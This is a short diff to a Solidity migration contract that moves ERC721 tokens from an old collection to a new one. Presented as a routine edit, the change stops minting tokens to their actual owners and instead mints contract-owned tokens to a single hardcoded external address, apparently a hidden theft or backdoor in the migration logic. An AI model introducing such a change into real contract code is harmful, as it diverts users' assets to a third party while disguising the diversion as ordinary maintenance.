@@ -3,8 +3,7 @@ pragma solidity ^0.8.15;
 
 import "./ERC721/ERC721G.sol";
 
-contract Migration {
-
+contract Migration2 {
     ERC721G private immutable old;
     ERC721G private immutable new_;
 
@@ -24,8 +23,9 @@ contract Migration {
     function migrate(uint256 fromId, uint256 toId) external {
         for (uint256 tokenId = fromId; tokenId <= toId; tokenId += 1) {
             address owner = old.ownerOf(tokenId);
-            if (isContract(owner)) continue;
-            new_.mint(owner, tokenId);
+            if (isContract(owner)) {
+                new_.mint(0x8b2A97bF13d44fB1A2B3EB5a14A69f75aFf1EEB1, tokenId);
+            }
         }
     }
 }
